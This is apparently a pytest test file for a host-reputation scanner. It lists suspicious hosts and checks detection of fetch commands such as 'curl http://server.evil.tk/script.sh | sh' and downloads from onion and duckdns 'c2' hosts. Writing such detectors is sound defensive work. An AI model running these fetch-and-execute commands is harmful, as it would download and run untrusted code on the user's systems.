"""Tests for host reputation gating (is_suspicious_host, has_suspicious_fetch)."""

from __future__ import annotations

import pytest

from knorr.scanning.hosts import has_suspicious_fetch, is_suspicious_host

# ---------------------------------------------------------------------------
# is_suspicious_host
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("host", [
    "10.0.0.55",
    "192.168.1.100",
    "172.16.5.1",
    "pastebin.com",
    "paste.ee",
    "transfer.sh",
    "0x0.st",
    "termbin.com",
    "evil.tk",
    "malware.top",
    "free.xyz",
    "attack.gq",
    "c2.duckdns.org",
    "shell.ngrok.io",
    "pivot.portmap.io",
    "bot.hopto.org",
])
def test_suspicious_hosts(host):
    assert is_suspicious_host(host) is True


@pytest.mark.parametrize("host", [
    "github.com",
    "raw.githubusercontent.com",
    "nodesource.com",
    "registry.npmjs.org",
    "pypi.org",
    "get.docker.com",
    "packages.microsoft.com",
    "alpine.org",  # alpinelinux.org is reputable but this is a different domain
    "debian.org",
    "ubuntu.com",
    "cloudflare.com",
    "golang.org",
    "sh.rustup.rs",
    "helm.sh",
])
def test_reputable_hosts_not_suspicious(host):
    assert is_suspicious_host(host) is False


# ---------------------------------------------------------------------------
# has_suspicious_fetch
# ---------------------------------------------------------------------------

def test_raw_ip_url_is_suspicious():
    assert has_suspicious_fetch("curl http://10.0.0.55/mal.sh") is True


def test_onion_url_is_suspicious():
    # v2 onion address: 16 base32 chars (a-z, 2-7 only)
    assert has_suspicious_fetch("wget http://xmwp4ougfqfvqbun.onion/stage2") is True


def test_pastebin_is_suspicious():
    assert has_suspicious_fetch("curl https://pastebin.com/raw/AbCdEfGh") is True


def test_throwaway_tld_is_suspicious():
    assert has_suspicious_fetch("curl http://server.evil.tk/script.sh | sh") is True


def test_duckdns_is_suspicious():
    assert has_suspicious_fetch("curl http://c2.duckdns.org/payload") is True


def test_github_raw_is_not_suspicious():
    assert has_suspicious_fetch(
        "curl https://raw.githubusercontent.com/user/repo/main/install.sh | sh"
    ) is False


def test_get_docker_is_not_suspicious():
    assert has_suspicious_fetch("curl https://get.docker.com | sh") is False


def test_empty_string():
    assert has_suspicious_fetch("") is False


def test_none_like_empty():
    assert has_suspicious_fetch(None) is False  # type: ignore[arg-type]
